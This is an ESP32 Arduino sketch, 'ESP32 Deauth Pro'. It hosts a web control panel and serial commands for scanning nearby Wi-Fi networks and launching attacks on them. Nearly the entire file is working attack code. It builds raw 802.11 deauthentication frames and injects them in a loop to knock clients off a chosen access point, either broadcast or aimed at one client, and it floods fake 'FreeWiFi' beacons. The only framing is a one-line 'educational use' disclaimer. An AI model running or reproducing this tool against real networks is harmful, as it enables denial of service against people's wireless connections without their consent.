/*
 * ESP32 Deauth Pro - Professional Security Testing Tool
 * FOR EDUCATIONAL USE ONLY. Use only on networks you own or have permission to test.
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <Preferences.h>

// ========== Configuration ==========
const char* AP_SSID = "DeauthPro";
const char* AP_PASS = "";
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

WebServer server(80);
DNSServer dnsServer;
Preferences prefs;

// ========== Attack State ==========
bool attackRunning = false;
bool beaconSpam = false;

uint8_t apMac[6] = {0};
int apChannel = 1;
String apSSID = "";

uint8_t clientMac[6] = {0};
bool useBroadcast = true;
uint8_t broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};   // <-- only one definition

unsigned long packetCount = 0;
unsigned long beaconCount = 0;

// ========== Packet Templates ==========
uint8_t deauthTemplate[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

uint8_t beaconTemplate[128] = {0};

// ========== Function Prototypes ==========
void scanNetworks();
void startAttack();
void stopAttack();
void sendDeauth();
void sendBeacon();
String generateNetworkJSON();
bool parseMac(String macStr, uint8_t* mac);
void processSerialCommand(String cmd);
void fillBeaconTemplate();

// ========== Web Page HTML ==========
const char MAIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ESP32 Deauth Pro</title>
<style>
  body { font-family: Arial, sans-serif; background: #1a1a1a; color: #eee; margin: 0; padding: 20px; }
  h1 { color: #ff4444; }
  button { background: #ff4444; color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 5px; cursor: pointer; }
  button:active { background: #cc0000; }
  select, input { padding: 8px; margin: 5px; border-radius: 4px; border: 1px solid #555; background: #333; color: #eee; }
  .section { margin: 20px 0; }
  .status { font-weight: bold; }
  #networks { max-height: 300px; overflow-y: auto; background: #222; padding: 10px; border-radius: 5px; }
  .network { padding: 5px; border-bottom: 1px solid #333; cursor: pointer; }
  .network:hover { background: #333; }
  .client { margin-left: 20px; font-size: 0.9em; color: #aaa; }
</style>
</head>
<body>
<h1>ESP32 Deauth Pro</h1>
<div id="status" class="status">Idle</div>
<div class="section">
  <button onclick="scan()">Scan Networks</button>
  <button onclick="location.reload()">Refresh</button>
  <button onclick="stopAttack()">Stop All Attacks</button>
</div>
<div class="section">
  <h3>Networks</h3>
  <div id="networks">Click "Scan Networks" to discover APs and clients.</div>
</div>
<div class="section">
  <h3>Manual Attack</h3>
  <input type="text" id="targetMAC" placeholder="AP MAC (AA:BB:CC:DD:EE:FF)">
  <input type="number" id="targetCh" placeholder="Channel" min="1" max="13">
  <select id="attackMode">
    <option value="broadcast">Broadcast Deauth</option>
    <option value="targeted">Targeted Client (enter client MAC below)</option>
    <option value="beacon">Beacon Spam</option>
  </select>
  <input type="text" id="clientMAC" placeholder="Client MAC (if targeted)">
  <button onclick="startAttack()">Start Attack</button>
</div>
<div class="section">
  <h3>Stats</h3>
  <p>Packets sent: <span id="pktCount">0</span></p>
  <p>Beacons: <span id="beaconCount">0</span></p>
</div>
<script>
function scan() {
  fetch('/scan').then(r => r.json()).then(data => {
    let html = '';
    data.forEach(net => {
      html += `<div class="network" onclick="selectAP('${net.bssid}', ${net.channel}, '${net.ssid}')">`;
      html += `${net.ssid} (${net.bssid}) Ch:${net.channel} RSSI:${net.rssi}`;
      if (net.clients && net.clients.length > 0) {
        html += `<div class="client">Clients: ${net.clients.join(', ')}</div>`;
      }
      html += '</div>';
    });
    document.getElementById('networks').innerHTML = html;
  });
}
function selectAP(mac, ch, ssid) {
  document.getElementById('targetMAC').value = mac;
  document.getElementById('targetCh').value = ch;
}
function startAttack() {
  let mac = document.getElementById('targetMAC').value;
  let ch = document.getElementById('targetCh').value;
  let mode = document.getElementById('attackMode').value;
  let client = document.getElementById('clientMAC').value;
  fetch(`/attack?mac=${mac}&ch=${ch}&mode=${mode}&client=${client}`)
    .then(r => r.text()).then(msg => {
      document.getElementById('status').innerText = msg;
      updateStats();
    });
}
function stopAttack() {
  fetch('/stop').then(r => r.text()).then(msg => {
    document.getElementById('status').innerText = msg;
    updateStats();
  });
}
function updateStats() {
  fetch('/stats').then(r => r.json()).then(d => {
    document.getElementById('pktCount').innerText = d.packets;
    document.getElementById('beaconCount').innerText = d.beacons;
  });
}
setInterval(updateStats, 2000);
</script>
</body>
</html>
)rawliteral";

// ========== SETUP ==========
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\nESP32 Deauth Pro - Educational Use Only");

  prefs.begin("deauth");

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, AP_PASS);
  
  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, []() {
    server.send_P(200, "text/html", MAIN_PAGE);
  });
  server.on("/scan", HTTP_GET, []() {
    String json = generateNetworkJSON();
    server.send(200, "application/json", json);
  });
  server.on("/attack", HTTP_GET, []() {
    if (server.hasArg("mac") && server.hasArg("ch")) {
      String macStr = server.arg("mac");
      parseMac(macStr, apMac);
      apChannel = server.arg("ch").toInt();
      apSSID = "Manual";
      
      String mode = server.arg("mode");
      if (mode == "targeted" && server.hasArg("client")) {
        parseMac(server.arg("client"), clientMac);
        useBroadcast = false;
      } else if (mode == "beacon") {
        beaconSpam = true;
        attackRunning = false;
        fillBeaconTemplate();
      } else {
        useBroadcast = true;
        beaconSpam = false;
      }
      startAttack();
      server.send(200, "text/plain", "Attack started");
    } else {
      server.send(400, "text/plain", "Missing parameters");
    }
  });
  server.on("/stop", HTTP_GET, []() {
    stopAttack();
    server.send(200, "text/plain", "Attack stopped");
  });
  server.on("/stats", HTTP_GET, []() {
    String json = "{\"packets\":" + String(packetCount) + ",\"beacons\":" + String(beaconCount) + "}";
    server.send(200, "application/json", json);
  });
  server.begin();
  Serial.println("Web interface started. Connect to 'DeauthPro' and open any webpage.");
  Serial.println("Or use Serial commands: scan, attack <num>, stop, help");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (attackRunning) {
    for (int i = 0; i < 50; i++) {
      sendDeauth();
      delay(0);
    }
  }
  if (beaconSpam) {
    sendBeacon();
    delay(1);
  }

  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    processSerialCommand(cmd);
  }
}

// ========== Attack Functions ==========
void startAttack() {
  attackRunning = true;
  beaconSpam = false;
  esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
  
  memcpy(deauthTemplate + 4, (useBroadcast ? broadcastMac : clientMac), 6);
  memcpy(deauthTemplate + 10, apMac, 6);
  memcpy(deauthTemplate + 16, apMac, 6);
  deauthTemplate[0] = 0xC0;
}

void stopAttack() {
  attackRunning = false;
  beaconSpam = false;
  Serial.println("Attack halted.");
}

void sendDeauth() {
  deauthTemplate[22]++;
  esp_wifi_80211_tx(WIFI_IF_AP, deauthTemplate, sizeof(deauthTemplate), false);
  packetCount++;
}

void fillBeaconTemplate() {
  uint8_t header[] = {
    0x80, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x31, 0x04
  };
  for (int i = 0; i < 6; i++) {
    header[10 + i] = random(256);
    header[16 + i] = header[10 + i];
  }
  String fakeSSID = "FreeWiFi";
  uint8_t ssidLen = fakeSSID.length();
  memcpy(beaconTemplate, header, sizeof(header));
  beaconTemplate[sizeof(header)] = 0x00;
  beaconTemplate[sizeof(header)+1] = ssidLen;
  memcpy(&beaconTemplate[sizeof(header)+2], fakeSSID.c_str(), ssidLen);
}

void sendBeacon() {
  esp_wifi_80211_tx(WIFI_IF_AP, beaconTemplate, sizeof(beaconTemplate), false);
  beaconCount++;
}

// ========== Scanning ==========
void scanNetworks() {
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d networks:\n", n);
  for (int i = 0; i < n; i++) {
    Serial.printf("[%d] %s (%s) Ch:%d RSSI:%d\n",
                  i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
                  WiFi.channel(i), WiFi.RSSI(i));
  }
}

String generateNetworkJSON() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"clients\":[]";
    json += "}";
  }
  json += "]";
  return json;
}

bool parseMac(String macStr, uint8_t* mac) {
  macStr.trim();
  if (macStr.length() != 17) return false;
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
             &values[0], &values[1], &values[2],
             &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
    return true;
  }
  return false;
}

void processSerialCommand(String cmd) {
  cmd.toLowerCase();
  if (cmd == "help") {
    Serial.println("Commands:");
    Serial.println("  scan                - Scan for networks");
    Serial.println("  attack <number>     - Attack network # from scan");
    Serial.println("  stop                - Stop all attacks");
    Serial.println("  stats               - Show packet counts");
  }
  else if (cmd == "scan") {
    scanNetworks();
  }
  else if (cmd.startsWith("attack ")) {
    int idx = cmd.substring(7).toInt();
    int n = WiFi.scanNetworks();
    if (idx >= 0 && idx < n) {
      memcpy(apMac, WiFi.BSSID(idx), 6);
      apChannel = WiFi.channel(idx);
      apSSID = WiFi.SSID(idx);
      useBroadcast = true;
      startAttack();
      Serial.printf("Attacking %s on channel %d\n", apSSID.c_str(), apChannel);
    } else {
      Serial.println("Invalid network number.");
    }
  }
  else if (cmd == "stop") {
    stopAttack();
  }
  else if (cmd == "stats") {
    Serial.printf("Deauth packets: %lu, Beacons: %lu\n", packetCount, beaconCount);
  }
  else {
    Serial.println("Unknown command. Type 'help'.");
  }
}